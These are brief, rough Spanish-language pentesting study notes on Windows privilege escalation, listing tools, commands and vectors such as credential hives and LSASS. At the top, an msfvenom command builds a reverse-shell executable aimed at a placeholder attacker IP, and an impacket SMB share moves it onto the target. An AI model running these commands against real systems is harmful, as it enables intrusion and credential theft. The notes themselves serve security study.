
Lolbas

###

***Maquina kali***

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=53 -f exe -o reverse.exe

impacket-smbserver share /home/kali/

***Maquina win***

copy \\IP_KALI\share\rev.exe

usar impacket para pasarnos cosas

![](Pasted%20image%2020260130184146.png)



### Herramientas

![](Pasted%20image%2020260130181114.png)

#### Herraminetas automatizadas

winpeas

#### Herraminetas manuales

PowerView

PowerUp -->  puedes hacer explotacion automatica es como winpeas pero resumidp 

SharpUp --> es como PowerUp sin explotacion

Accesschk,exe --> Comprueba que permisos tiene el usuario para parar procesos, modificat archivos...

Seatbelt.exe --> Ve procesos y binarios custom en el sistema

#### Comandos

Icals
Findstr --> 
Reg query --> Es el comando de terminal que noss permite consultar las claves de registro y ver las que tenemos

Cmdkeys --> Comprueba las claves que hay del sistema para poder ejecutarlas como otro usuario

Whoami --> 



### Vectores de escalada


Archivos con contraseña

Memoria local / Registry Hives: (SAM, SYSTEM, SOFTWARE, SECURITY, NTUSER.dat)(LSASS)


**Abuso de configuraciones** --> tienen más relevancia que en Linux

**Versiones desactualizada**


**Abusos en el registro**


**Abusos en los binarios**